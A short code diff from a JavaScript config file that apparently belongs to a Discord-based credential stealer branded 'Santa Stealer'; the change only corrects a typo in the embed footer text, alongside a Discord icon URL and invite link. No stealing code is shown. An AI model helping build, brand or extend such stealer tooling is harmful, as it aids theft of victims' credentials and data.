@@ -22,7 +22,7 @@ var config = {
     embed: {
         username: "Santa Stealer",
         footer: {
-            text: `Santa Steale`,
+            text: `Santa Stealer`,
             icon_url: "https://cdn.discordapp.com/icons/1038524136839970966/c1f59fee8f2263be631d13420922089c.webp?size=96",
         },
         href: "https://discord.gg/As5C8yUVHa",
